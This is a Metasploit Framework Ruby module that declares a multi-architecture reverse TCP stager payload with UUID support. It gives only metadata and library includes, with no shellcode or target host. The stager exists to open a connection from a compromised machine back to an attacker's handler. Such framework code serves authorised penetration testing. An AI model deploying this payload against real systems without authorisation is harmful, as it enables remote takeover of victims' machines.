##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/multi/reverse_tcp_uuid'

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Stager
  include Msf::Payload::Multi
  include Msf::Payload::Multi::ReverseTcpUUID

  def self.handler_type_alias
    'reverse_tcp_uuid'
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Reverse TCP Stager with UUID Support (Mulitple Architectures)',
      'Description' => 'Tunnel communication over TCP with UUID support',
      'Author'      => 'OJ Reeves',
      'License'     => MSF_LICENSE,
      'Platform'    => ['multi'],
      'Arch'        => ARCH_ALL,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Stager'      => {'Payload' => ''},
      'Convention'  => 'sockedi'
    ))
  end

end
